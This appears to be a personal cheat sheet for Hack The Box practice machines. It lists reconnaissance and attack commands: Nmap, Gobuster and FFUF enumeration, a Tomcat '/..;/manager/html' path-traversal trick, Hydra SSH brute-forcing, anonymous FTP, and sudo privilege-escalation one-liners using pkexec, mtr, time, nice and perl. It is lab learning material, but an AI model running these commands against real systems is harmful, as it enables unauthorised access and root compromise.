# Hackthebox
- default page /robots.txt /S3cret-T3xt

- [Nmap](#nmap)
- [BurpSuite](#burp)
- [Gobuster](#gobuster)
- [FFUF](#ffuf)
- [Privilege escalation](#privilegeescalation)
- [Hydra](#hydra)
- [FTP](#ftp)
- [Cewl](#cewl) - It is use to create a worldlist using website link

- ## Nmap <a name="nmap"></a>
- ```nmap -sC -sV -vv -oA nmap/report.txt <ip>```
- ```sudo nmap -Pn -A -p- -T4 <ip> > nmap.txt```

- ## Burp Suite <a name="burp"></a>
- use ```/manager/html``` or ```/..;/manager/html``` in the middel of ```GET/ HTTP/1.1```
  - so it will like this ```GET/ /..;/manager/html HTTP/1.1```
  - whenever you see JSESSIONID=.... use this.
 
- use ```[]==``` for the password if you don't know the pass 
 
- ## Gobuster <a name="gobuster"></a>
- ```gobuster dir -u <url> -k -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt```

- ## FFUF <a name="ffuf"></a>
- FFUF is used to filter the invalid pages 
- ```ffuf -u <url>/FUZZ -k -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt```
- ```ffuf -u <url>/FUZZ -k -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -r -fs 27200```
  - if you are getting the size same of all use filter size and give the size there.
 
- ## Privilege escalation <a name="privilegeescalation"></a>
- if you find ```/usr/bin/pkexec``` in ```sudo -l``` 
  - then use the below command it will give you the root privilege
  - ```sudo pkexec /bin/bash```

- if you find ```/usr/bin/mtr``` in ```sudo -l``` 
  - then use the below command it will give you the root privilege
  - ```LFILE=/root/proof.txt```
  - ```sudo mtr --raw -F "$LFILE"```

- if you find ```/usr/bin/time``` in ```sudo -l``` 
  - then use the below command it will give you the root privilege
  - ```sudo /usr/bin/time /bin/bash```

- if you find ```(ALL : ALL) /bin/nice /notes/*``` in ```sudo -l```
  - it shows that you can run all the files in the /notes directory with /bin/nice binary.
  - so create a script letsgetroot.sh which executes /bin/bash and gave the necessary permissions.
  - ```echo "/bin/bash" >> letsgetroot.sh``` save the file in any directory
  - ```sudo /bin/nice /notes/../home/user/letsgetroot.sh``` it will give the root access.


- if you find ```(ALL : ALL) NOPASSWD: /usr/bin/perl``` in ```sudo -l```
  - then use the below command it will give you the root privilege
  - ```sudo perl -e 'exec "/bin/bash";'```

- ## Hydra <a name="hydra"></a>
- ssh renu@127.0.0.1
- if you don't know the password do brute force attack. replace username with ```renu``` and ipaddress with ```127.0.01```
- ```hydra -l <username> -P /usr/share/wordlists/rockyou.txt <ipaddress> ssh -t 50```


- ## FTP <a name="ftp"></a>
- ftp <ip>
  - user:anonymous
  - pass:
  - 230 Login successful
  - to upload a file use ```put <filename>```
  - to download a file use ```get <filename>```

- ## Cewl <a name="cewl"></a>
- ```cewl -w passwords.txt http://192.168.245.48:1898/?q=node/1```
